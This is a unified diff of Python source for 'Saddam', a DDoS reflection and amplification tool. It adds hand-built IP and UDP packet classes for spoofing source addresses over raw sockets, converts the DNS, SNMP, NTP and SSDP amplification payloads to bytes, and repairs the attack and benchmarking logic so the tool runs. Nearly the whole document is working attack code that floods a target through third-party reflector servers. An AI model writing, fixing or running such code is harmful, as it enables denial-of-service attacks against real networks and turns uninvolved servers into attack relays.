@@ -3,16 +3,139 @@ import sys
 import time
 import socket
 import struct
+import random
 import threading
 from random import randint
 from optparse import OptionParser
 
-# Fixed import - assuming these are custom classes in your project
-try:
-    from pinject import IP, UDP
-except ImportError:
-    print("Error: pinject module not found. Please ensure IP and UDP classes are available.")
-    sys.exit(1)
+# Custom IP and UDP classes to replace the missing pinject module
+class IP:
+    def __init__(self, source, destination, data, proto=socket.IPPROTO_TCP):
+        self.source = source
+        self.destination = destination
+        self.data = data
+        self.proto = proto
+        
+    def pack(self):
+        # IP header fields
+        ip_ver = 4
+        ip_ihl = 5
+        ip_tos = 0
+        ip_tot_len = 20 + len(self.data)  # IP header + data
+        ip_id = random.randint(0, 65535)
+        ip_frag_off = 0
+        ip_ttl = 255
+        ip_proto = self.proto
+        ip_check = 0  # Will be calculated later
+        
+        # Pack the IP header
+        ip_ihl_ver = (ip_ver << 4) + ip_ihl
+        
+        # Source IP to 32-bit format
+        saddr = socket.inet_aton(self.source)
+        daddr = socket.inet_aton(self.destination)
+        
+        # IP header
+        ip_header = struct.pack('!BBHHHBBH4s4s',
+                               ip_ihl_ver,
+                               ip_tos,
+                               ip_tot_len,
+                               ip_id,
+                               ip_frag_off,
+                               ip_ttl,
+                               ip_proto,
+                               ip_check,
+                               saddr,
+                               daddr)
+        
+        # Calculate checksum
+        ip_check = self.checksum(ip_header)
+        
+        # Repack with correct checksum
+        ip_header = struct.pack('!BBHHHBBH4s4s',
+                               ip_ihl_ver,
+                               ip_tos,
+                               ip_tot_len,
+                               ip_id,
+                               ip_frag_off,
+                               ip_ttl,
+                               ip_proto,
+                               socket.htons(ip_check),
+                               saddr,
+                               daddr)
+        
+        return ip_header
+    
+    def checksum(self, data):
+        """Calculate IP checksum"""
+        if len(data) % 2:
+            data += b'\x00'
+        
+        s = 0
+        for i in range(0, len(data), 2):
+            w = (data[i] << 8) + data[i+1]
+            s += w
+        
+        s = (s >> 16) + (s & 0xffff)
+        s = ~s & 0xffff
+        return s
+
+class UDP:
+    def __init__(self, sport, dport, data):
+        self.sport = sport
+        self.dport = dport
+        self.data = data
+        
+    def pack(self, source, destination):
+        # UDP header fields
+        udp_length = 8 + len(self.data)
+        udp_checksum = 0
+        
+        # Pack UDP header
+        udp_header = struct.pack('!HHHH', 
+                                self.sport, 
+                                self.dport, 
+                                udp_length, 
+                                udp_checksum)
+        
+        # Pseudo header for checksum calculation
+        saddr = socket.inet_aton(source)
+        daddr = socket.inet_aton(destination)
+        placeholder = 0
+        protocol = socket.IPPROTO_UDP
+        
+        pseudo_header = struct.pack('!4s4sBBH',
+                                   saddr,
+                                   daddr,
+                                   placeholder,
+                                   protocol,
+                                   udp_length)
+        
+        # Calculate checksum
+        udp_checksum = self.checksum(pseudo_header + udp_header + self.data)
+        
+        # Repack with correct checksum
+        udp_header = struct.pack('!HHHH', 
+                                self.sport, 
+                                self.dport, 
+                                udp_length, 
+                                udp_checksum)
+        
+        return udp_header
+    
+    def checksum(self, data):
+        """Calculate UDP checksum"""
+        if len(data) % 2:
+            data += b'\x00'
+        
+        s = 0
+        for i in range(0, len(data), 2):
+            w = (data[i] << 8) + data[i+1]
+            s += w
+        
+        s = (s >> 16) + (s & 0xffff)
+        s = ~s & 0xffff
+        return s
 
 USAGE = '''
 %prog target.com [options]        # DDoS
@@ -22,7 +145,7 @@ USAGE = '''
 LOGO = r'''
 	   _____           __    __              
 	  / ___/____ _____/ /___/ /___ _____ ___ 
-	  \__ \/ __ `/ __  / __  / __ `/ __ `__ \\
+	  \__ \/ __ `/ __  / __  / __ `/ __ `__ \
 	 ___/ / /_/ / /_/ / /_/ / /_/ / / / / / /
 	/____/\__,_/\__,_/\__,_/\__,_/_/ /_/ /_/ 
 	https://github.com/OffensivePython/Saddam
@@ -64,30 +187,30 @@ PORT = {
 	'ssdp': 1900 }
 
 PAYLOAD = {
-	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
-			'{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
-			'\x00\x00\x00\x00\x00\x00'),
-	'snmp':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
-		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
-		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
-		'\x01\x02\x01\x05\x00'),
-	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
-	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
-		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
+	'dns': (b'%b\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
+			b'%b\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
+			b'\x00\x00\x00\x00\x00\x00'),
+	'snmp': (b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
+		b'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
+		b'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
+		b'\x01\x02\x01\x05\x00'),
+	'ntp': (b'\x17\x00\x02\x2a' + b'\x00'*4),
+	'ssdp': (b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
+		b'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
 }
 
 amplification = {
 	'dns': {},
 	'ntp': {},
 	'snmp': {},
-	'ssdp': {} }		# Amplification factor
+	'ssdp': {} }
 
-FILE_NAME = 0			# Index of files names
-FILE_HANDLE = 1 		# Index of files descriptors
+FILE_NAME = 0
+FILE_HANDLE = 1
 
-npackets = 0			# Number of packets sent
-nbytes = 0				# Number of bytes reflected
-files = {}				# Amplifications files
+npackets = 0
+nbytes = 0
+files = {}
 
 SUFFIX = {
 	0: '',
@@ -96,7 +219,6 @@ SUFFIX = {
 	3: 'G',
 	4: 'T'}
 
-# Thread-safe counters
 npackets_lock = threading.Lock()
 nbytes_lock = threading.Lock()
 
@@ -105,7 +227,7 @@ def Calc(n, d, unit=''):
         return '0' + unit
     i = 0
     r = float(n)
-    while r/d>=1 and i < len(SUFFIX)-1:
+    while r/d >= 1 and i < len(SUFFIX)-1:
         r = r/d
         i += 1
     return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)
@@ -116,25 +238,23 @@ def GetDomainList(domains):
     if domains.upper().endswith('.TXT'):
         try:
             with open(domains, 'r') as file:
-                content = file.read()
-                content = content.replace('\r', '')
-                content = content.replace(' ', '')
-                content = content.split('\n')
-                for domain in content:
-                    if domain and domain.strip():
-                        domain_list.append(domain.strip())
+                for line in file:
+                    domain = line.strip()
+                    if domain and not domain.startswith('#'):
+                        domain_list.append(domain)
         except IOError as e:
             print(f"Error reading domain file {domains}: {e}")
             sys.exit(1)
     else:
         domain_list = [d.strip() for d in domains.split(',') if d.strip()]
     
+    if not domain_list:
+        print("Error: No valid domains found")
+        sys.exit(1)
+    
     return domain_list
 
 def Monitor():
-    '''
-        Monitor attack
-    '''
     print(ATTACK)
     FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
     start = time.time()
@@ -151,8 +271,8 @@ def Monitor():
                 pps = current_packets / current
                 out = FMT.format(Calc(current_packets, 1000), 
                     Calc(current_bytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
-                sys.stderr.write('\r{}{}'.format(out, ' '*(60-len(out))))
-                sys.stderr.flush()
+                sys.stdout.write('\r{}{}'.format(out, ' '*(60-len(out))))
+                sys.stdout.flush()
             time.sleep(1)
     except KeyboardInterrupt:
         print('\nInterrupted')
@@ -161,7 +281,7 @@ def Monitor():
 
 def AmpFactor(recvd, sent):
     if sent == 0:
-        return 'N/A (division by zero)'
+        return 'N/A (0B sent)'
     return '{}x ({}B -> {}B)'.format(recvd//sent, sent, recvd)
 
 def Benchmark(ddos):
@@ -177,12 +297,12 @@ def Benchmark(ddos):
                             for domain in ddos.domains:
                                 i += 1
                                 recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
-                                if sent > 0 and recvd > 0:
+                                if sent > 0 and recvd >= sent:
                                     print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
                                         AmpFactor(recvd, sent), domain))
                         else:
                             recvd, sent = ddos.GetAmpSize(proto, soldier)
-                            if sent > 0 and recvd > 0:
+                            if sent > 0 and recvd >= sent:
                                 print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier, 
                                     AmpFactor(recvd, sent), 'N/A'))
                                 i += 1
@@ -191,7 +311,7 @@ def Benchmark(ddos):
             continue
     print('Total tested:', i)
 
-class DDoS(object):
+class DDoS:
     def __init__(self, target, threads, domains, event):
         self.target = target
         self.threads = threads
@@ -206,57 +326,47 @@ class DDoS(object):
             threads.append(t)
             t.start()
         
-        # Wait for all threads to complete
         for t in threads:
             t.join()
             
     def __send(self, sock, soldier, proto, payload):
-        '''
-            Send a Spoofed Packet
-        '''
         try:
             udp = UDP(randint(1, 65535), PORT[proto], payload).pack(self.target, soldier)
             ip = IP(self.target, soldier, udp, proto=socket.IPPROTO_UDP).pack()
             sock.sendto(ip + udp + payload, (soldier, PORT[proto]))
             return True
         except Exception as e:
-            print(f"Error sending packet to {soldier}: {e}")
             return False
             
     def GetAmpSize(self, proto, soldier, domain=''):
-        '''
-            Get Amplification Size
-        '''
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(2)
+        sock.settimeout(3)
         data = b''
+        packet = b''
         
         try:
             if proto in ['ntp', 'ssdp']:
-                packet = PAYLOAD[proto].encode() if isinstance(PAYLOAD[proto], str) else PAYLOAD[proto]
+                packet = PAYLOAD[proto]
                 sock.sendto(packet, (soldier, PORT[proto]))
-                try:
-                    while True:
+                start_time = time.time()
+                while time.time() - start_time < 2:  # 2 second timeout
+                    try:
+                        sock.settimeout(1)
                         chunk, _ = sock.recvfrom(65535)
                         data += chunk
-                except socket.timeout:
-                    pass
+                    except socket.timeout:
+                        break
             else:
                 if proto == 'dns':
                     packet = self.__GetDnsQuery(domain)
                 else:
                     packet = PAYLOAD[proto]
-                    
-                # Ensure packet is bytes
-                if isinstance(packet, str):
-                    packet = packet.encode()
-                    
+                
                 sock.sendto(packet, (soldier, PORT[proto]))
                 data, _ = sock.recvfrom(65535)
         except socket.timeout:
             data = b''
         except Exception as e:
-            print(f"Error testing {soldier} for {proto}: {e}")
             data = b''
         finally:
             sock.close()
@@ -264,31 +374,17 @@ class DDoS(object):
         return len(data), len(packet)
         
     def __GetQName(self, domain):
-        '''
-            QNAME A domain name represented as a sequence of labels 
-            where each label consists of a length
-            octet followed by that number of octets
-        '''
         labels = domain.split('.')
         QName = b''
         for label in labels:
             if label:
-                QName += struct.pack('B', len(label)) + label.encode()
+                QName += struct.pack('B', len(label)) + label.encode('utf-8')
         return QName
         
     def __GetDnsQuery(self, domain):
-        id = struct.pack('H', randint(0, 65535))
+        id = struct.pack('!H', randint(0, 65535))
         QName = self.__GetQName(domain)
-        base_payload = PAYLOAD['dns']
-        # Ensure proper formatting for bytes
-        if isinstance(base_payload, str):
-            base_payload = base_payload.encode('latin-1')
-        if isinstance(id, str):
-            id = id.encode('latin-1')
-        if isinstance(QName, str):
-            QName = QName.encode('latin-1')
-            
-        return base_payload.format(id, QName)
+        return PAYLOAD['dns'] % (id, QName)
         
     def __attack(self):
         global npackets, nbytes
@@ -303,10 +399,12 @@ class DDoS(object):
                 continue
                 
         try:
+            # Note: Raw sockets require root privileges
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        except socket.error as e:
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        except (socket.error, PermissionError) as e:
             print(f"Raw socket creation failed: {e}")
-            print("This script requires root/administrator privileges")
+            print("This script requires root/administrator privileges for raw socket operations")
             return
             
         try:
@@ -315,21 +413,20 @@ class DDoS(object):
                     soldier = _files[proto][FILE_HANDLE].readline().strip()
                     if not soldier:
                         _files[proto][FILE_HANDLE].seek(0)
-                        continue
-                        
+                        soldier = _files[proto][FILE_HANDLE].readline().strip()
+                        if not soldier:
+                            continue
+                    
                     if proto == 'dns':
                         if soldier not in amplification[proto]:
                             amplification[proto][soldier] = {}
                         for domain in self.domains:
                             if domain not in amplification[proto][soldier]:
-                                size, _ = self.GetAmpSize(proto, soldier, domain)
-                                if size == 0:
-                                    break
-                                elif size < len(PAYLOAD[proto]):
+                                size, sent = self.GetAmpSize(proto, soldier, domain)
+                                if size == 0 or size < sent:
                                     continue
-                                else:
-                                    amplification[proto][soldier][domain] = size
-                                    
+                                amplification[proto][soldier][domain] = size
+                            
                             amp = self.__GetDnsQuery(domain)
                             if self.__send(sock, soldier, proto, amp):
                                 with npackets_lock:
@@ -338,18 +435,19 @@ class DDoS(object):
                                     nbytes += amplification[proto][soldier][domain]
                     else:
                         if soldier not in amplification[proto]:
-                            size, _ = self.GetAmpSize(proto, soldier)
-                            if size < len(PAYLOAD[proto]):
+                            size, sent = self.GetAmpSize(proto, soldier)
+                            if size == 0 or size < sent:
                                 continue
-                            else:
-                                amplification[proto][soldier] = size
-                                
+                            amplification[proto][soldier] = size
+                        
                         amp = PAYLOAD[proto]
                         if self.__send(sock, soldier, proto, amp):
                             with npackets_lock:
                                 npackets += 1
                             with nbytes_lock:
                                 nbytes += amplification[proto][soldier]
+        except Exception as e:
+            print(f"Error in attack thread: {e}")
         finally:
             sock.close()
             for proto in _files:
@@ -377,7 +475,7 @@ def main():
         if domains:
             files['dns'] = [dns_file]
         else:
-            print('Specify valid domains to resolve (e.g: --dns=dns.txt:evildomain.com)')
+            print('No valid domains specified')
             sys.exit(1)
             
     if options.ntp:
@@ -395,27 +493,29 @@ def main():
     event.set()
     
     if args[0].upper() == 'BENCHMARK':
-        ddos = DDoS(args[0], options.threads, domains, event)
+        ddos = DDoS('127.0.0.1', options.threads, domains, event)  # Dummy target for benchmark
         Benchmark(ddos)
     else:
         try:
             target_ip = socket.gethostbyname(args[0])
+            print(f"Target: {args[0]} -> {target_ip}")
         except socket.gaierror:
             print(f"Error: Cannot resolve target {args[0]}")
             sys.exit(1)
             
         ddos = DDoS(target_ip, options.threads, domains, event)
         
-        # Start attack in a separate thread
         attack_thread = threading.Thread(target=ddos.stress)
         attack_thread.daemon = True
         attack_thread.start()
         
         try:
             Monitor()
+        except KeyboardInterrupt:
+            print("\nShutting down...")
         finally:
             event.clear()
-            attack_thread.join(timeout=5)
+            attack_thread.join(timeout=2)
 
 if __name__ == '__main__':
     main()
